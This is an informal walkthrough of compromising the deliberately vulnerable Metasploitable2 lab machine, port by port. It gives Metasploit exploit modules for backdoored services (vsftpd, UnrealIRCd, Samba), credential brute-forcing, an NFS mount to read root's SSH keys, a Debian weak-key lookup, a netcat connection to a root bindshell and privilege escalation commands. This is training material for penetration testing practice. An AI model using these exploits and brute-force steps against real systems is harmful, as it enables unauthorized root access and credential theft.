# Metasploitable2-Walk-through

### download the machine from https://www.vulnhub.com/entry/metasploitable-2,29/  
then launch using VMware credentials are msfadmin:msfadmin
ip a to get machine 

Notes :
----

make sure your system is upgraded           
sudo apt update && sudo apt upgrade                 
sudo apt install exploitdb 


scan the target using nmap 
--
Nmap -sV -Sc 192.168.1.9

found some open ports (21 -22--25-53-80-111,139-445-1009,514,1099,15243306-5430-8009)
 
  
now lets walkthrough each port and see what we can do (separately and combined):
----

PORT  ::  STATE  ::  SERVICE ::  VERSIO
  
21/tcp :: open :: ftp ::   vsftpd 2.3.4  
  ----
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

no files to surf

MSF search for  vsftpd 2.3.4 , there are a back door vuln , 

msf > use exploit/unix/ftp/vsftpd_234_backdoor

msf exploit(vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

 Name Current Setting Required Description
 
 ---- --------------- -------- -----------
 
 RHOST 192.168.0.14 yes The target address
 
 RPORT 21 yes The target port
 
Payload options (cmd/unix/interact):

 Name Current Setting Required Description
 
Exploit target:

 Id Name
  
 0 Automatic
 
msf exploit(vsftpd_234_backdoor) > run

[*] Banner: 220 (vsFTPd 2.3.4)

[*] USER: 331 Please specify the password.

[+] Backdoor service has been spawned, handling...

[+] UID: uid=0(root) gid=0(root)

[*] Found shell.

[*] Command shell session 11 opened (192.168.0.13:47287 -> 192.168.0.14:6200) at 2015-06-14 19:04:19 -0600

id

uid=0(root) gid=0(root)

  
also assuming that the service was not vulnarble there is a weak credinitial could be obtained from brute frocing

nmap <tagetip> 21 --script =ftp-brute.nse

took 600s to find valid credential of user:user 

 
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
----
trying the same credentials of fttp for ssh it works :D 

  now we can execute files on the machine  with limited privilage 
 
 get step back and use nmap script engine for intensive scanning for port22
 
 nmap -sV -sC 192.168.1.3 -p 22 --script vuln get some result 
 
 CVE-2011-1013 CVSS 7.2
---
 allows local users to cause a denial of service (system crash)

 CVE-2010-4478 CVSS 7.5
---
 which allows remote attackers to bypass the need for knowledge of the shared secret, and successfully authenticate
 
  unfortunately there are no proof of concept or working exploit available online also there are no Metasploit module for them
 
 so I've moved to another approached " brute forcing the service for root credentials " using metaspolit
 ---
 msf > use auxiliary/scanner/ssh/ssh_login
 
msf auxiliary(ssh_login) > set RHOSTS 10.0.0.27
 
RHOSTS => 192.168.1.3
 
msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 

 msf auxiliary(ssh_login) > run
 
 no promising results , so lets use the credential user:user we already extracted before and attemp privleage esciliation 
  
 write down this command 
  
  nmap --interactive
  sh
  
  whoami >> root 
  
  
23/tcp   open  telnet      Linux telnetd
---

  nmap -sV -sC 192.168.1.3 -p 23 --script vuln get some result
 search sploits for telnet Linux 
 couldn't verify that the service is vulnerable 

 25/tcp   open  smtp        Postfix smtpd
 -----
 
 nmap -sV -sC 192.168.1.3 -p 23 --script vuln get some result
 the service is vulnerable to two mitm attacks (which i skipped) 
 enumerating the user using smpt-user-enum tool getting me this result 
 --
 
 192.168.1.3:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data

brute forcing the password using hydra but authentication not enabled on the server 
 
 53/tcp   open  domain      ISC BIND 9.4.2
----
 using nmap engine found CVE-2008-0122 CSSV 10.0 vulneraries that causes Denial Of Service Execute Code Memory corruption

 
 There are not any Metasploit modules related to this CVE or any working online exploit
 
 
 
 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
---
 running nmap , searching edb and mfs couldn't verify vulnerability for the exact version of the service
  
 111/tcp  open  rpcbind     
  ----
  
 showmount -e 192.168.130.134 
  
  /* 
  
  now let's take every thing 
  
  sudo mount -t nfs 192.168.130.134:/ /tmp/metasp2 
  
cat /tmp/metasp2/root/.ssh/authorized_keys
  
  copy the ssh_rsa key 
  
  search exploit database for openssl 
 
 download  the exploit 5622.tar.bz2

https://www.exploit-db.com/exploits/5720
  
 tar -jxvf 5622.tar.bz2
 
 grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w *.pub
 
 now we got our key 57c3115d77c56390332dc5c49978627a-5429.pub

 attempt to connect as a root
 
 ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@192.168.1.9 
 
 whoami >> root
  
  
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
      445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
----
 saerching exploit database for Samba getting me MSF module that returns a root shell 
 > use exploit/multi/samba/usermap_script
> set RHOST 192.168.1.3
> exploit 

 $whoami 

 root 
 sudo/etc/shadow :D 
  
  
  512/tcp  open  exec        netkit-rsh rexecd
----
  couldn't veify weather the service is vulnarable 
  
  1099/tcp open  java-rmi    GNU Classpath grmiregi
  ----
  
 search java rmi
  
  use 3
  
  set lhost 192.168.1.2
  
  set Rhost 192.168.1.9
  
  set payload payload/java/shell/bind_tcp
  
  run 
  
  whoami >> root
  
  1524/tcp open  bindshell   Metasploitable root shell
---
  
  nc 192.168.130.134 1524 
  
  whoami >> root 
  
  
  
 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
 ---
 Could not find any vulnerabilities matching this version
 
 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
---
 
searching the MSF i found a module for remote shell 
 
 msf >> use exploit/linux/postgres/postgres_payload
 
 set RHOST 192.168.1.9
 
 run 
 
 whoami >> postgres
 
 now attend previllige esclation
 
 cat /root/.ssh/authorized_keys
 
 copy the rsa key
 
 search exploit database for openssl 
 
 download  the exploit 5622.tar.bz2

https://www.exploit-db.com/exploits/5720
  
 tar -jxvf 5622.tar.bz2
 
 grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w *.pub
 
 now we got our key 57c3115d77c56390332dc5c49978627a-5429.pub

 attempt to connect as a root
 
 ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@192.168.1.9 
 
 whoami >> root

 5900/tcp open  vnc         VNC (protocol 3.3)
----
  MSF : search vnc 3.3
  
  use auxiliary/scanner/vnc/vnc_login
  
  set THost 192.168.1.9
  
  Run 
  
  [+] 192.168.130.134:5900  - 192.168.130.134:5900 - Login Successful: :password                           
  
  vncviewer 192.168.1.9:5900 
  
  whoami >> root
  
  6667/tcp open  irc          UnrealIRCd
---
  
  msf : search irc Unreal 
  
  use exploit/unix/irc/unreal_ircd_3281_backdoor
  
  set Rhost 192.168.1.9 
  
  Run 
  
  whoami >> root 
  
  
  
 8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
-----
 It an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat
 
 seems not to be vulnerable 
 
 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
---
 search msf for vulnerability , found RCE that need to be authenticated so we will attempt a brute force searching for weak credentials
 
 use auxiliary/scanner/http/tomcat_enum
 
 set Rhost 192.168.1.9
 
 set targeturi /maanger
 
 set rport 8180
 
 run 
 
 [+] http://192.168.1.9:8180/manager - Users found: admin, both, manager, role1, root, tomcat
 

use auxiliary/scanner/http/tomcat_mgr_login 

 set username tomcat
 
 run 
 
 [+] 192.168.1.19:8180 - Login Successful: tomcat:tomcat

 use exploit/multi/http/tomcat_mgr_deploy
 
set Rhost 192.168.1.9
 
 set targeturi /manager
 
 run 
 
 now we've got our credential lets move for the shell
 
 use exploit/multi/http/tomcat_mgr_deploy
 
 set RHost 192.168.1.9

 set RPORT 8180 

 set httpusername tomcat

 set httppasword tomcat

 run 
 
 now we have our shell and can attend a prev escalation as the way we did with postgress above
 
 
Thanks for taking some time reading this i hope it was useful please don't hesitate correcting me any mistake for giving me advise
 ----
